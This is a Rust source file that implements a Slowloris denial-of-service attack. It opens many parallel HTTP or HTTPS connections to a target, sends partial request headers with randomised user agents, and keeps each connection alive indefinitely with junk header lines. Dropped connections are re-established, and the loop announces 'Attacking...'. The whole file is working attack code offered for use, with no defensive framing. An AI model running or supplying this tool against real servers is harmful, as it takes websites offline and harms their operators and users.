mod consts;
mod types;
mod err;

use types::Stream;
use err::LorisError;

extern crate native_tls;
extern crate url;
extern crate rand;
extern crate rayon;

use native_tls::TlsConnector;
use url::Url;
use rand::Rng;
use rayon::prelude::*;

use std::io::Write;
use std::net::TcpStream;
use std::time::Duration;
use std::thread;

pub fn do_loris(url: &str, timeout: u64, requests: u64) -> Result<(), LorisError> {
    let url = Url::parse(url)?;
    let init_header = get_init_header(&url);
    let mut connections: Vec<_> = (0..requests)
        .into_par_iter()
        .map(|_| spawn_connection(&url, &init_header))
        .collect();

    loop {
        println!("Attacking...");
        connections.par_iter_mut().for_each(|connection| {
            let loris_header = get_loris_header();
            let res = connection.write_all(&loris_header);
            if res.is_err() {
                println!("Timeout, reseting connection...");
                let mut new_connection = spawn_connection(&url, &init_header);
                std::mem::swap(connection, &mut new_connection);
            }
        });
        println!("Done!");
        thread::sleep(Duration::from_millis(timeout));
    }
}


fn get_stream(url: &Url) -> Stream<TcpStream> {
    let domain = url.host_str().unwrap();
    let port = url.port_or_known_default().unwrap();
    let stream = TcpStream::connect((domain, port)).unwrap();
    if url.scheme() == "https" {
        let connector = TlsConnector::builder().unwrap().build().unwrap();
        Stream::Tls(connector.connect(domain, stream).unwrap())
    } else {
        Stream::Plain(stream)
    }
}

fn spawn_connection(url: &Url, init_header: &[u8]) -> Stream<TcpStream> {
    let mut stream = get_stream(url);
    stream.write_all(init_header).unwrap();
    stream
}

fn get_init_header(url: &Url) -> Vec<u8> {
    let mut rng = rand::thread_rng();
    let user_agent = consts::USER_AGENTS[rng.gen_range(0, consts::USER_AGENTS.len())];
    format!(
        "GET {} HTTP/1.1\r\n\
         Host: {}\r\n\
         User-Agent: {}\r\n",
        url.path(),
        url.host_str().unwrap(),
        user_agent
    ).as_bytes()
        .to_vec()
}

fn get_loris_header() -> Vec<u8> {
    format!("X-a: {}\r\n", rand::random::<u32>())
        .as_bytes()
        .to_vec()
}
